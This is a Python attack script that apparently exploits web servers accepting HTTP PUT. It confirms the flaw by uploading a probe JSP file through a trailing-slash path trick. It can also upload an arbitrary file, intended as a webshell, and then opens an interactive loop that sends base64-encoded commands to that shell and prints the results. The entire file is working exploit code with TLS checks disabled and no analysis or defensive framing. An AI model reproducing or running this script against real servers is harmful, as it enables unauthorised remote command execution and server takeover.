import requests
import argparse
import os
import re
import base64
import urllib3
import secrets
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_put_method(url):
    if 'put' in requests.options(url).headers['Allow'].lower():
        return True
    return False

def removetags(tags):
    remove = re.compile('<.*?>')
    txt = re.sub(remove, '\n', tags)
    return txt.lstrip(" \n")

def check(url):
    _headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    }
    sign = secrets.token_hex(16)
    _data = f'<% out.println("{sign}"); %>'
    resp = requests.put(url + '/' + "test.jsp" + '/', data=_data, headers=_headers, verify=False)
    resp = requests.get(url + '/' + "test.jsp", headers=_headers, verify=False)
    if sign in resp.text:
        return True
    return False

def upload(url, file_name, content):
    _headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    }
    resp = requests.put(url + '/' + file_name + '/', data=content, headers=_headers, verify=False)
    print("[+] File upload status: ", resp.status_code)
    print(resp.text)
    return True

def webshell(url):
    webshell_url = input(f"[?] Your webshell url ({url}): ") or url
    param = input(f"[?] Param for command (id): ") or "id"
    opt_base64 = input(f"[?] Base64 encode CMD (Y/n): ") or "Y"
    while True:
        cmd = input("[?] CMD: ")

        if cmd not in ["exit", "quit"]:
            _headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
            }
            if opt_base64.lower() == "y":
                cmd = base64.b64encode(cmd.encode()).decode('utf-8')
            resp = requests.post(webshell_url, data={param: cmd}, headers=_headers, verify=False)
            print("[*] Result:\n")
            print(removetags(resp.text))



parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", dest="url", help="target's url", required=True)
parser.add_argument("-c", "--check", action="store_true", help="only check if target is vulnerable")
parser.add_argument("-f", "--file", dest="file", help="path to file upload", required=False)

args = parser.parse_args()

args.url = args.url.strip('/')
if check_put_method(args.url):
    print("[+] Target allows PUT method")
    if args.file:
        file_name = os.path.basename(args.file)
        file_content = open(args.file, "r").read()
        if upload(args.url, file_name, file_content):
            webshell(args.url + '/' + file_name)
        else:
            print("[-] Target is Not Vunerable!")
    elif "check" in args:
        if check(args.url):
            print("[+] Target is Vulnerable!")
        else:
            print("[-] Target is Not Vunerable!")
else:
    print("[+] Target don't allow PUT method")